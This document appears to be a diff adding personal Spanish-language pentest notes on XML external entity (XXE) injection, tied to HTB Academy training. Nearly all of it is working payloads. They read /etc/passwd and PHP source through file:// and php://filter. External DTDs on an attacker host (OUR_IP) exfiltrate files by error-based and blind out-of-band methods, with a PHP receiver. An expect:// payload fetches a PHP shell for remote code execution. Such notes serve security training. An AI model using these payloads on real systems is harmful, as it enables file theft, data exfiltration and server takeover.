@@ -1,0 +1,76 @@
+	#### XML external entity injection
+Se da cuando la data XML es tomada de forma directa del usuario.
+<?xml version="1.0" encoding="UTF-8"?>
+
+	### Testear
+<!DOCTYPE email [
+  <!ENTITY company "Inlane Freight">
+]>
+
+	### Read local files
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+#Esto nos puede servir para referenciar al entity company (&company;) y que sea devuelto el file en el input que determinamos vulnerable
+
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+#Usando wrappers php para obtener la data que no se pueda ver por el formato disinto a xml que posee
+
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %xxe;
+]>
+#CDATA indica a XML que la data debe estar como raw, generando que toda la data que no tenga una sintaxis xml pueda ser recibida sin problemas
+#Al final se realiza referencia a nuestro servidor para que se pueda referenciar con &joined;
+<!ENTITY joined "%begin;%file;%end;">
+#Esto es lo que tenemos dentro de nustro archivo dtd
+
+	## Lectura basada en error
+Hay casos donde no vamos a tener un mensaje donde se pueda ver el parametro vulnerable. En estos casos se debe intentar que se arroje un error.
+Estos errores pueden ser dados modificando un tag para que no cierre/abra o referenciando algo inexistente (ej: &noExiste;)
+
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+#Esto va en el cuarpo del xml el cual esta referenciando, nuevamente, un archivo dtd de nuestro servidor
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+#Nuestro archivo dtd tiene el contenido de arriba con esa sintaxis para que pueda ser referenciado
+
+	## Blind XXE
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+#Codigo XML que va en la request
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+#Codigo en el archivo xxe.dtd el cual nos va a recibir en base64 el contenido
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+#Codigo PHP para que el contenido sea decodeado y mostrado en pantalla. Este codigo va en el index.php
+#Para que funcione se debe levantar un sv con php -S 0.0.0.0:8000. Si se lo hace con python se recibe el base64 pero no se manda a index.php
+
+	### Remote code execution
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+#En paginas web php podemos compartir un archivo que tenga una shell php y llamarla de esta forma.
+#El modulo expect no esta instalado como default en las nuevas versiones php, por lo que podria no funcionar.
+
+	### Tool
+https://github.com/enjoiz/XXEinjector
+#Mas info en: https://academy.hackthebox.com/module/134/section/1207
